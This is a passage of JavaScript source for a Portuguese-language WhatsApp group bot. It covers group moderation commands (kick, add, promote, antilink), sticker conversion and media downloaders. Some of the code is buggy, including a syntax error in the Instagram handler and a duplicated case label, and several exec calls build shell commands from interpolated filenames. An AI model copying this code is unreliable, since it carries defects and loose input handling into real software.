}
m.reply('*Success*')
 }
 break
case 'hidetag': {
 if (!m.isGroup) return m.reply(mess.group)
 if (!isAdmins) return m.reply(mess.admin)
 anya.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
 }
 break
case 'promote': {
if (!m.isGroup) return m.reply(mess.group)
   if (!isBotAdmins) return m.reply(mess.botAdmin)
   if (!isAdmins) return m.reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anya.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return m.reply(mess.group)
   if (!isBotAdmins) return m.reply(mess.botAdmin)
   if (!isAdmins) return m.reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anya.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'tiktok': case 'tiktoknowm': {
                if (!text) return m.reply('Insira o link de consulta!')
                m.reply(mess.wait)
                let anu = await fetchJson(`https://botcahx-rest-api.herokuapp.com/api/dowloader/tikok?url=${text}`)
                let buttons = [
                    {buttonId: `!menu`, buttonText: {displayText: 'Menu '}, type: 1},
                    {buttonId: `!tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.video },
                    //caption: `Baixar de ${text}`,
                    footer: `${watermark}`,
                    buttons: buttons,
                    headerType: 5
                }
                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'welcome': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
const alone5 = `${iswelcm ? 'Ativado✅':'Desativado❌'}`
if (!isAdmins && !groupOwner && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (iswelcm) return m.reply('Já Esta Ativado.')
wlcm.push(from)
m.reply('Sucesso ao ativar a mensagem de boas-vindas neste grupo')
} else if (args[0] === "off") {
if (!iswelcm) return m.reply('Já desativado')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sucesso ao desativar a mensagem de boas-vindas neste grupo')
} else {
  if (alone5 == 'Ativado✅') {
let buttonsk = [
  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, 'o modo de boas vindas esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
}
if (alone5 == 'Desativado❌') {
let buttonsk = [
  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, 'o anti link esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
}
} 
}
  break
case `kick`: case `ban`: case `banir`: case `chutar`: case `tirardogp`: {
		    
		//     		
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
		if (!m.isGroup) return m.reply(mess.group)
   if (!isBotAdmins) return m.reply(mess.botAdmin)
   if (!isAdmins) return m.reply(mess.admin)
		{
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return m.reply('Responda a mensagem ou marque as pessoas que você quer remover do grupo')
if(m.message.extendedTextMessage.contextInfo.participant !== null && m.message.extendedTextMessage.contextInfo.participant != undefined && m.message.extendedTextMessage.contextInfo.participant !== "") {
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid[0] ? m.message.extendedTextMessage.contextInfo.mentionedJid[0] : m.message.extendedTextMessage.contextInfo.participant
let responseb = await anya.groupParticipantsUpdate(from, [mentioned], 'remove')
if (responseb[0].status === "200") anya.sendMessage(from, {text: `@${mentioned.split("@")[0]} foi removido do grupo com sucesso.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb[0].status === "406") anya.sendMessage(from, {text: `@${mentioned.split("@")[0]} criou esse grupo e não pode ser removido(a) do grupo️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb[0].status === "404") anya.sendMessage(from, {text: `@${mentioned.split("@")[0]} já foi removido(a) ou saiu do grupo`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else anya.sendMessage(from, {text: `Hmm parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
} else if (m.message.extendedTextMessage.contextInfo.mentionedJid != null && m.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
if(mentioned.length > 1) {
if(mentioned.length > groupMembers.length || mentioned.length === groupMembers.length || mentioned.length > groupMembers.length - 3) return m.reply(`Vai banir todo mundo mesmo?`)
sexocomrato = 0
for (let banned of mentioned) {
await sleep(100)
let responseb2 = await anya.groupParticipantsUpdate(from, [banned], 'remove')
if (responseb2[0].status === "200") sexocomrato = sexocomrato + 1
}
anya.sendMessage(from, {text: `${sexocomrato} participantes removido do grupo`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
} else {
let responseb3 = await anya.groupParticipantsUpdate(from, [mentioned[0]], 'remove')
if (responseb3[0].status === "200") anya.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} foi removido do grupo com sucesso.️`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb3[0].status === "406") anya.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} criou esse grupo e não pode ser removido(a) do grupo️`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb3[0].status === "404") anya.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} já foi removido(a) ou saiu do grupo`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else anya.sendMessage(from, {text: `Hmm parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
}
}
}
}
	break
case 'figu':
{
(async function () {
var numero = `${m.sender.split('@')[0]}`
var legenda = `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT:`
var autor = `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` 
if (isMedia && !m.message.videoMessage || isQuotedImage) {
var encmedia = isQuotedImage ? m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : m.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(rane)
// "android-app-store-link": "https://play.google.com/store/search?q=%2B55%2094%209147-2796%20%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5&c=apps",
var json = {
"sticker-pack-name": legenda,
"sticker-pack-publisher": autor
}
var exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
var jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
var exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = Math.floor(Math.random() * (99999 - 11111 + 1) + 11111)+".temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
anya.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: m})
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else if (isMedia && m.message.videoMessage.seconds < 11 || isQuotedVideo && m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 35) {
var encmedia = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
await ffmpeg(`./${rane}`)
.inputFormat(rane.split('.')[1])
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(rane)
let json = {
"sticker-pack-name": legenda,
"sticker-pack-publisher": autor
}
let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
let jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
let exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = "temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
anya.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: m})
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else {
m.reply(`Você precisa enviar ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
}
})().catch(e => {
console.log(e)
m.reply("Hmm deu erro")
try {
if (fs.existsSync("temp.exif")) fs.unlinkSync("temp.exif");
if (fs.existsSync(rano)) fs.unlinkSync(rano);
if (fs.existsSync(media)) fs.unlinkSync(media);
} catch {}
})
}
break
	case `add`: case `adicionar`: case `addgp`: case `adicionarnogp`: {
		    
		// addFilter(from)    		
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
		if (!m.isGroup) return m.reply(mess.group)
   if (!isBotAdmins) return m.reply(mess.botAdmin)
   if (!isAdmins) return m.reply(mess.admin)
		if(!q && m.message.extendedTextMessage === null) return m.reply('Marque a mensagem ou coloque o número de quem você quer adicionar no grupo')
try {
useradd = `${args.join(" ").replace(/\D/g,'')}` ? `${args.join(" ").replace(/\D/g,'')}` : m.message.extendedTextMessage.contextInfo.participant
let id = `${useradd.replace(/\D/g,'')}`
if(!id) return m.reply(`Número inválido`)
let [result] = await anya.onWhatsApp(id)
if(!result) return m.reply(`Esse número não está registrado no WhatsApp`)
let response = await anya.groupParticipantsUpdate(from, [result.jid], "add")
if(response[0].status == "409") {
anya.sendMessage(from, {text: `o usuário já está no grupo, como eu vou adicionar?`, mentions: [result.jid, sender]}, {quoted:m})
} else if(response[0].status == "403") {
anya.sendMessage(from, {text: `Não consegui adicionar o @${result.jid.split("@")[0]} porque ele privou a conta`, mentions: [result.jid, sender]}, {quoted:m})
} else if(response[0].status == "408") {
anya.sendMessage(from, {text: `Não consegui adicionar o @${result.jid.split("@")[0]} porque ele saiu recentemente do grupo.`, mentions: [result.jid, sender]}, {quoted:m})
} else if(response[0].status == "401") {
anya.sendMessage(from, {text: `Não consegui adicionar o @${result.jid.split("@")[0]} porque ele bloqueou o bot`, mentions: [result.jid, sender]}, {quoted:m})
} else if(response[0].status == "200") {
anya.sendMessage(from, {text: `Prontinho!!`, mentions: [result.jid, sender]}, {quoted:m})
} else {
m.reply("erro")
}
} catch {
}
	}
	
	break

case 'antiwame': {
   if (!m.isGroup) return m.reply(mess.group)
   if (!isBotAdmins) return m.reply(mess.botAdmin)
   if (!isAdmins) return m.reply(mess.admin)
   if (args[0] === "on") {
   if (db.chats[m.chat].wame) return m.reply(`Ja estava ativo`)
   db.chats[m.chat].wame = true
   m.reply(`Ativado!`)
   } else if (args[0] === "off") {
   if (!db.chats[m.chat].wame) return m.reply(`Ja estava desativado`)
   db.chats[m.chat].wame = false
   m.reply(`Nao estava ativo!`)
   } else {
    let buttons = [
{ buttonId: '!antiwame on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '!antiwame off', buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttons, `Modo Anti Wa.me`, `${nomedobot}`, m)
   }
}
break
case 'limitecaracteres':
case 'limiteflood':  
//addFilter(from) 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!m.isGroup) return m.reply(resposta.group)
if (!isAdmins && !isGroupOwner) return m.reply(mess.admim)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args[0]  === 'on'){
if (isAntiFlood) return m.reply(`🌀 O recurso limite de caracteres até ${limitefl} já está ativo no grupo 🌀`)
antiflood.push(from)
fs.writeFileSync('./database/antis/antiflood.json', JSON.stringify(antiflood))
m.reply('✔️ O recurso limite de caracteres ${limitefl} foi ativado nesse grupo📝')
} else if (args[0] === 'off'){
 if (!isAntiFlood) return m.reply('✔️ O recurso limite de caracteres não está ativado no grupo 📝')
let position = false
Object.keys(antiflood).forEach((i) => {
if (antiflood[i] === from) {
position = i
}
})
if (position !== false) {
antiflood.splice(position, 1)
fs.writeFileSync('./database/antis/antiflood.json', JSON.stringify(antiflood))
}
m.reply('O recurso limite de caracteres foi desativado nesse grupo ✔️')  
}
break
case 'limitec':
//addFilter(from) 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if(!isCreator) return m.reply(mess.owner)
if (args.length < 1) return
limitefl = args.join(" ")
limitefll.limitefl = limitefl
fs.writeFileSync('./database/flood.json', JSON.stringify(limitefll, null, '\t'))
m.reply(`${limitefl} foi adicionado como limite de antiflood `)
break
case 'mediafire': {
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (args.length < 1) return m.reply('Digite o link do arquivo que deseja buscar no Mediafire')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return m.reply('Link invalido')
m.reply('*「 ❗ 」 Aguarde um pouco, baixando seu jogo/app...*')
teks = args.join(' ')
const resm = await mediafireDl(teks)
if (resm[0].size.split('MB')[0] >= 100) return m.reply('*arquivo acima do limite* ')
resultt = `*「  MEDIAFIRE DOWNLOAD  」*

*Nome :*${resm[0].nama}
*Tamanho :*${resm[0].size}`.trim()
let buttons = [
                    {buttonId: `${prefix}mediabx ${q}`, buttonText: {displayText: `BAIXAR`}, type: 1}
                ]
                await anya.sendButtonText(m.chat, buttons, resultt, `${watermark}`, m)
}
break
case 'mediabx':{
m.reply('*aguarde, baixando seu app/jogo...\n\nobs: isso deve demorar um pouco, tenha paciência!*')
teks = args.join(' ')
const resm = await mediafireDl(teks)
if (resm[0].size.split('MB')[0] >= 100) return m.reply('*arquivo acima do limite* ')
anya.sendMessage(m.chat, { document : { url : resm[0].link}, fileName : resm[0].nama, mimetype: resm[0].mime }, { quoted : m }).catch ((err) => m.reply(mess.error))
}
break
case 'antilink': {
 if (!m.isGroup) return m.reply(mess.group)
 if (!isBotAdmins) return m.reply(mess.botAdmin)
 if (!isAdmins) return m.reply(mess.admin)
 if (args[0] === "on") {
 if (db.chats[m.chat].antilink) return m.reply(`*Ja estava ativo*`)
 db.chats[m.chat].antilink = true
 m.reply(`*Antilink ativo*`)
 } else if (args[0] === "off") {
 if (!db.chats[m.chat].antilink) return m.reply(`*Ja estava off*`)
 db.chats[m.chat].antilink = false
 m.reply(`*Antilink desativado*`)
 } else {
let drips = [
{ buttonId: '!antilink on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: '!antilink off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await anya.sendButtonText(m.chat, drips, `*Antilink*`, `${nomedobot}`, m)
}
}
break
case 'gimage':
case 'pesquisa': case 'googleimage': {
m.reply(mess.wait)
if (!text) return m.reply(`Example : ${prefix + command} ml nana`)
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
  {buttonId: `${prefix}gimage ${text}`, buttonText: {displayText: 'Nova imagem'}, type: 1}
   ]
   let buttonMessage = {
  image: { url: images },
  caption: `❰ 𝗚𝗢𝗢𝗚𝗟𝗘 ❱
*Pesquisa* : ${text}`,
  footer: `${nomedobot}`,
  buttons: buttons,
  headerType: 4
   }
   anya.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
case "igdl":
        {
          var url2 = args[0];
          if (!url)2
            return m.reply("Você precisa enviar o link para baixar o video");
          instagram
            .insta_post(url2)
            .then(async (data) => {
              anya.sendMessage(
                m.chat,
                { video: { url: data.post1.url }, caption: 'aqui está seu vídeo' },
                { quoted: m }
              );
            })
            .catch(() => m.reply("ocorreu um erro"));
        }
        break
case 'igreel': {	            
if (!text) return m.reply('*cade o link?*')
const { instagramdl, instagramdlv2, instagramdlv3 } = require('@bochilteam/scraper')
if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return m.reply('*O link que você forneceu não é válido*')
   
instagramdlv3(`${text}`).then(async (data) => {            
var buf = await getBuffer(data[0].thumbnail)        
anya.sendMessage(m.chat, { video: { url: data[0].url }, jpegThumbnail:buf, caption: `${nomedobot}`}, { quoted: m })
}).catch((err) => {
m.reply(`*Falha ao baixar mídia e enviar vídeos*`)
})
}
break
case `pinterest`: {
//addFilter(from) 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
const templateMessage = {
text: "*_AGUARDE.._*",
footer: 'não deve demorar muito..',
templateButtons: []
}

anya.sendMessage(m.chat, templateMessage)
		let { pinterest } = require(`./lib/scraper`)
                anujj = await pinterest(text)
                result1 = anujj[Math.floor(Math.random() * anujj.length)]
let gam = await getBuffer(result1)
let buttons = [
                    {buttonId: `${prefix}pinterest ${q}`, buttonText: {displayText: `PROXIMO`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result1 },
                    caption: `Resultados da pesquisa ${q}`,
                    footer: `${watermark}`,
                    buttons: buttons,
                    headerType: 4
                }
                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
break
case 'togif': {
   if (!quoted) return m.reply('Reply Image')
   if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)
   m.reply(mess.wait)
let { webp2mp4File } = require('./lib/uploader')
   let media = await anya.downloadAndSaveMediaMessage(quoted)
   let webpToMp4 = await webp2mp4File(media)
   await anya.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
   await fs.unlinkSync(media)
 }
 break
case 'toimage': case 'toimg': {
   if (!quoted) return m.reply('*imagem?*')
   if (!/webp/.test(mime)) return m.reply(`responder adesivo com legenda *${prefix + command}*`)
   m.reply(mess.wait)
   let media = await anya.downloadAndSaveMediaMessage(quoted)
   let ran = await getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
  fs.unlinkSync(media)
  if (err) throw err
  let buffer = fs.readFileSync(ran)
  anya.sendMessage(m.chat, { image: buffer }, { quoted: m })
  fs.unlinkSync(ran)
   })
 }
 break
case 'ytmp4': case 'ytvideo': {
let { ytv } = require('./lib/y2mate')
if (!text) return m.reply(`Exemplo : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`)
if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return m.reply('*O link que você forneceu não é válido*')
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return m.reply('*Arquivo acima do limite* ')
var capti = `
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ⟮ _*◉ʏᴏᴜᴛᴜʙᴇ ᴅᴏᴡɴʟᴏᴀᴅ◉*_ ⟯ 
   
0.02━◉━━━━━━━━━━━━3.26
      🔂   ⏪   ⏸️     ⏩  🎵\n\n*◉TITULO* : ${media.title}\n*◉TAMANHO* : ${media.filesizeF}\n*◉URL* : ${isUrl(text)}\n*◉EXT* : MP3\n*◉RESOLUÇÃO* : ${args[1] || '360p'}*`
var buf = await getBuffer(media.thumb)
anya.sendMessage(m.chat, { image: { url: media.thumb }, jpegThumbnail:buf, caption: `${capti}` }, { quoted: m })
anya.sendMessage(m.chat, { video: { url: media.dl_link }, jpegThumbnail:buf, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `*Baixando de ${text}*` ,  quoted: m,contextInfo: { externalAdReply:{
title:"anya-md",
body:"anya-md",
showAdAttribution: true,
mediaType:2,
thumbnail: fs.readFileSync(`./lib/anya.jpg`) ,
mediaUrl:`https://wa.me/+558898204406`, 
sourceUrl: `https://wa.me/+558898204406` }}}, {quoted: m})
}
break
case 'ytmp3':  case 'ytmusic': {    
m.reply(mess.wait)
let { yta } = require('./lib/y2mate')
if (!text) return m.reply(`Exemplo : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return m.reply('*Link invalido*')   
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return m.reply('*Arquivo acima do limite*')
anya.sendMessage(m.chat, {document:{url:media.dl_link}, mimetype:"audio/mpeg", fileName: `${media.title}.mp3`,  quoted: m, contextInfo: { externalAdReply:{
title:"anya-md",
body:"anya-bot",
showAdAttribution: true,
mediaType:2,
thumbnail: fs.readFileSync(`./lib/anya.jpg`) ,
mediaUrl:`https://wa.me/+558898204406`, 
sourceUrl: `https://wa.me/+558898204406` }}})
}
break
case 'sticker': case 'stickergif': case 's': {
 if (!quoted) return m.reply(`Marque um video ou imagem assim ${prefix + command}`)
var numero = `${m.sender.split('@')[0]}`
 m.reply(mess.wait)
  if (/image/.test(mime)) {
   let media = await quoted.download()
   let encmedia = await anya.sendImageAsSticker(m.chat, media, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` })
   await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
   if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximo 10 segundos!')
   let media = await quoted.download()
   let encmedia = await anya.sendVideoAsSticker(m.chat, media, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` })
   await fs.unlinkSync(encmedia)
 } else {
   m.reply(`Envie uma imagem/video com a legenda !sticker`)
   }
 }
 break
 case 'happymod': {
/*   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)*/
if (!args.join(" ")) return m.reply(`Example : ${prefix + command} mobile legend`)
yogipw.happymod(args.join(" ")).then(async(res) => {
teks = '```「 HappyMod 」```'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}`
}
let buttons = [
{buttonId: `!menu`, buttonText: {displayText: 'Menu🥀'}, type: 1}
]
let buttonMessage = {
image: {url:res[0].icon},
jpegThumbnail: img,
caption: teks,
footer: `${nomedobot}`,
buttons: buttons,
headerType: 4
}
anya.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
case 'play': {
m.reply(mess.wait)
let { yta } = require('./lib/y2mate')
if (!text)  m.reply(`Exemplo : ${prefix + command} met gala - tz da coronel `)
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buf = await getBuffer(anu.thumbnail)
let caption = `
*Titulo* ${anu.title}
*Peso* ${anu.filesize}
*Link* ${anu.url}
*Descrição* ${anu.description}`
let buttons = [
                    {buttonId: `${prefix}ytmp4 ${anu.url}`, buttonText: {displayText: `VIDEO`}, type: 1},
                     {buttonId: `${prefix}ytmp3 ${anu.url}`, buttonText: {displayText: `DOCUMENTO`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: caption,
                    footer: `${watermark}`,
                    buttons: buttons,
                    headerType: 4
                }
                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
addContg(sender, anu.url)               
setTimeout(async function () {
kk = '*deseja baixar está música?*'
m.reply(kk)
}, 4000)
}

break
case 'playvideo': {
//anu = await fetchJson(`https://api.akuari.my.id/downloader/play3?query=${q}&type=360`)
let buttons = [
                        { buttonId: `!video480 ${q}`, buttonText: { displayText: `480p` }, type: 1 }, 
                        { buttonId: `!video720 ${q}`, buttonText: { displayText: `720p` }, type: 1 },                      
                         { buttonId: `!video1080 ${q}`, buttonText: { displayText: `1080p` }, type: 1 },           
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_ESCOLHA A QUALIDADE PARA SEU VÍDEO!_*`, `${watermark}`)        
}
break
case 'video480': {
anu = await fetchJson(`https://api.akuari.my.id/downloader/play3?query=${q}&type=480`)
alonexis = `Título: ${anu.title}\nId: ${anu.id}`
anya.sendMessage(m.chat, { video: { url: anu.mp4.download, caption: alonexis } }, { quoted: m })
}
break
case 'video720': {
anu = await fetchJson(`https://api.akuari.my.id/downloader/play3?query=${q}&type=720`)
alonexis = `Título: ${anu.title}\nId: ${anu.id}`
anya.sendMessage(m.chat, { video: { url: anu.mp4.download, caption: alonexis } }, { quoted: m })
}
break
case 'video1080': {
anu = await fetchJson(`https://api.akuari.my.id/downloader/play3?query=${q}&type=1080`)
alonexis = `Título: ${anu.title}\nId: ${anu.id}`
anya.sendMessage(m.chat, { video: { url: anu.mp4.download, caption: alonexis } }, { quoted: m })
}
break
case 'play2':{
m.reply(mess.wait)
let { yta } = require('./lib/y2mate')
if (!text) return m.reply(`Exemplo : ${prefix + command} met gala - tz da coronel `)
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buf = await getBuffer(anu.thumbnail)
let caption = `
*── 「 USUÁRIO 」 ──*

*🗂 ️Nome: ${pushname}*
*📆 Data: ${datakk}*
*🕗 Horário: ${timekk}*

*── 「 INFORMAÇÃO 」 ──*

*📝 Titulo* ${anu.title}
*⚖️ Peso* ${anu.filesize}
*📌 Link* ${anu.url}
*📃 Descrição* ${anu.description}`
let buttons = [
                    {buttonId: `${prefix}ytmp4 ${anu.url}`, buttonText: {displayText: `VIDEO`}, type: 1},
                     {buttonId: `${prefix}ytmp3 ${anu.url}`, buttonText: {displayText: `DOCUMENTO`}, type: 1},
                     {buttonId: `${prefix}ytmp3k ${anu.url}`, buttonText: {displayText: `AUDIO`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: caption,
                    footer: `${watermark}`,
                    buttons: buttons,
                    headerType: 4
                }
                anya.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
 case 'listgc': {
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = ` 「  Lista de usuários do grupo da anya 」\n\nTotal de usuários que estão usando o bot em Grupos: ${anu.length}`
 for (let i of anu) {
  let metadata = await anya.groupMetadata(i)
  if (metadata.owner === "undefined") {
  loldd = false
  } else {
  loldd = metadata.owner
  }
  teks += `\n\nNome : ${metadata.subject ? metadata.subject : "undefined"}\nProprietário : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\nFeito : ${metadata.creation ? moment(metadata.creation * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nMembros : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
 }
 anya.sendTextWithMentions(m.chat, teks, m)
 }
 break
case 'covidinfo':
case 'covid':
let { covid } = require('./lib/covid.js') 
const c = await covid()
var { kasus, kematian, sembuh } = c[0]
anya.sendMessage(from, {text : `Casos : ${kasus}\n\nMortes : ${kematian}\n\nCurados : ${sembuh}`}, m)
break
case 'ytbmp3':  case 'ytmusic': {	  
                let { yta } = require('./lib/y2mate')
                if (!text) return m.reply(`Exemplo : ${prefix + command} https://youtube.com/watch?v=1gQkk4Zo6rE 128kbps`)
                if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return m.reply('*O link que você forneceu não é válido*')
                
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('*Arquivo acima do limite* '+util.format(media))
               var buf = await getBuffer(media.thumb)
                anya.sendMessage(m.chat, {audio:{url:media.dl_link}, mimetype:"audio/mpeg", fileName: `${media.title}.mp3`,  quoted: m, contextInfo: { externalAdReply:{
                showAdAttribution: true,
                title:media.title,
                body:"YOUTUBE MP3",
                mediaType:2,
                thumbnail:buf,
                mediaUrl:`${text}`, 
                sourceUrl: `${media.title}` }}}, {quoted:m})
                }
            break
case 'ytmp3k': {	  
m.reply(mess.wait)
                let { yta } = require('./lib/y2mate')
                if (!text) return m.reply(`Exemplo : ${prefix + command} https://youtube.com/watch?v=1gQkk4Zo6rE 128kbps`)
                if (!isUrl(args[0]) && !args[0].includes('youtube.com')) return m.reply('*O link que você forneceu não é válido*')
                
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('*Arquivo acima do limite* '+util.format(media))
               var buf = await getBuffer(media.thumb)
                anya.sendMessage(m.chat, {audio:{url:media.dl_link}, mimetype:"audio/mpeg", fileName: `${media.title}.mp3`,  quoted: m, contextInfo: { externalAdReply:{
                showAdAttribution: true,
                title:media.title,
